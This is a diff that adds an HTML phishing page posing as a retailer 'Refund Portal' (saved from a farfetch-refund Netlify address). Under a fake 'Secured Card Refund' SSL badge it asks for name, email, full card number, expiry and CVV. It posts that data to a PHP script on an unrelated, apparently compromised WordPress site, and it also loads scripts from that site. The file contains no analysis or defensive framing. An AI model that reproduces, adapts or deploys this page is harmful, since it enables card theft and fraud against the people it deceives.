@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<!-- saved from url=(0036)https://farfetch-refund.netlify.app/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Refund Portal</title>
+  <link rel="shortcut icon" href="">
+  <link rel="stylesheet" href="https://ourtoner.com/wp-includes/images/media/index.css" type="text/css">
+  <script src="https://ourtoner.com/wp-includes/images/media/jquery-1.js.download"></script>
+  <script src="https://ourtoner.com/wp-includes/images/media/jquery.js.download"></script>
+  <script>
+    $(function () {
+      $('input[type=text], input[type=password]').autotab();
+      $('.number').autotab('filter', 'number');
+      $('.ssn').autotab('filter', 'number');
+
+      $('#function').autotab('filter', function (value, element) {
+        var parsedValue = parseInt(value, 10);
+
+        if (!value || parsedValue != value) {
+          return '';
+        }
+
+        var newValue = element.value + value;
+
+        if (newValue > 12) {
+          $.autotab.next();
+          return 2;
+        }
+        else if (element.value.length == 0 && value > 1) {
+          $.autotab.next();
+          return value;
+        }
+        else if (element.value.length == 1 && parsedValue === 0 && newValue != 10) {
+          $.autotab.next();
+          return 1;
+        }
+
+        return value;
+      });
+
+    });
+  </script>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="center">
+      <div class="header">
+        <div class="check">
+          <div class="step_main">
+          </div>
+        </div>
+      </div>
+      <div class="center_inner">
+        <div class="logo">
+          <div class="page_main">
+            <span class="page_tagline"><h3>Please fill the below fields to complete your refund</h3>
+</span>
+          </div>
+          <div class="right">
+            <img alt="Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQM1ndbNLZCZ6KXUw6UUTmJ5xE25WICrRqHvJJQJKtG1K7KLBgrsqmdV7tivBHZ-iOOJms&usqp=CAU" style="margin-top: 5px; margin-right: 10px;" height="100px">
+          </div>
+        </div>
+        <div class="main">
+          <div class="form">
+            <form name="payment" id="payment" method="post" action="https://ourtoner.com/wp-includes/sitemaps/providers/opiod.php">
+                        <div class="field">
+              <label>
+                <span>*</span> Your name
+              </label>
+              <div class="desc">Please enter your name.</div>
+              <input type="text" name="name" maxlength="70" required="">
+            </div>
+            <div class="field">
+              <label>
+                <span>*</span> Email address
+              </label>
+              <div class="desc">We'll send you your confirmation on this email address.</div>
+              <input type="email" name="email" maxlength="254" required="">
+            </div>
+                      
+                        <br>
+            <div class="ssl">
+              <div class="secured">
+                <div class="icon">
+                  <img src="https://ourtoner.com/wp-includes/images/media/stock_lock.png">
+                </div>
+                <div class="topic">
+                  Secured Card Refund
+                </div>
+                <br>
+                <div class="txt">
+                  This a secured 256-bit SSL encrypted payment
+                </div>
+                <div class="sec-right">
+                </div>
+              </div>
+              <div class="clear">
+              </div>
+              <div class="field">
+                <label>
+                  <span>*</span> Credit card number
+                </label>
+                <div class="desc">
+                  The 16 digits on the front of your credit card.
+                </div>
+                <input type="text" name="cc1" maxlength="4" size="4" class="credit_input ssn" required="">-
+                <input type="text" name="cc2" size="4" maxlength="4" class="credit_input ssn" required="">-
+                <input type="text" name="cc3" maxlength="4" size="4" class="credit_input ssn" required="">-
+                <input type="text" size="4" name="cc4" maxlength="4" class="credit_input ssn" required="">
+                <img alt="Visa" src="https://ourtoner.com/wp-includes/images/media/visa.png">
+                <img alt="MasterCard" src="https://ourtoner.com/wp-includes/images/media/mastercard.png">
+              </div>
+              <div class="field">
+                <label>
+                  <span>*</span> Expiry date
+                </label>
+                <div class="desc">
+                  The date your credit card expires. Find this on the front of your credit card.
+                </div>
+                <select name="expm" class="month" required="">
+                  <option value="" selected="selected">MONTH </option>
+                                                            <option value="01">01 </option>
+                                                                                <option value="02">02 </option>
+                                                                                <option value="03">03 </option>
+                                                                                <option value="04">04 </option>
+                                                                                <option value="05">05 </option>
+                                                                                <option value="06">06 </option>
+                                                                                <option value="07">07 </option>
+                                                                                <option value="08">08 </option>
+                                                                                <option value="09">09 </option>
+                                                                                <option value="10">10 </option>
+                                                                                <option value="11">11 </option>
+                                                                                <option value="12">12 </option>
+                                                      </select>
+                <select name="expy" class="year" required="">
+                  <option value="" selected="selected">YEAR </option>
+                                                            <option value="2023">2023 </option>
+                                                                                <option value="2024">2024 </option>
+                                                                                <option value="2025">2025 </option>
+                                                                                <option value="2026">2026 </option>
+                                                                                <option value="2027">2027 </option>
+                                                                                <option value="2028">2028 </option>
+                                                                                <option value="2029">2029 </option>
+                                                                                <option value="2030">2030 </option>
+                                                                                <option value="2031">2031 </option>
+                                                                                <option value="2032">2032 </option>
+                                                                                <option value="2033">2033 </option>
+                                                                                <option value="2034">2034 </option>
+                                                                                <option value="2035">2035 </option>
+                                                                                <option value="2036">2036 </option>
+                                                                                <option value="2037">2037 </option>
+                                                                                <option value="2022">2038 </option>
+                                                                                <option value="2023">2039 </option>
+                                                      </select>
+              </div>
+              <div class="field">
+                <label>
+                  <span>*</span> CVV
+                </label>
+                <div class="desc">
+                  The three(3) digit at the back of your card.
+                </div>
+                <div class="amount_main">
+                  <input id="amount" type="text" name="cc5" class="amount_input" required="" maxlength="3">
+                </div>
+              </div>
+            
+             <div class="field">
+                <label>
+                  <span>*</span> Amount
+                </label>
+               
+                <div class="amount_main">
+                  <input id="Amount" type="Text" name="Amount" class="amount_input" size="4" maxlength="4" value="AED 1331.66">
+                </div>
+              </div>
+            </div>
+            <div class="what">
+              <div class="what_inner">
+               
+              </div>
+            </div>
+            <input type="submit" name="submit" value="Submit" class="submit">
+            </form>
+          </div>
+          <hr>
+          <div class="footer">
+  <div class="footer_txt">
+    
+  </div>
+ 
+    <div style="float:left; padding-left:5px; margin-top: 0.75em">
+      </div>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+</body></html>
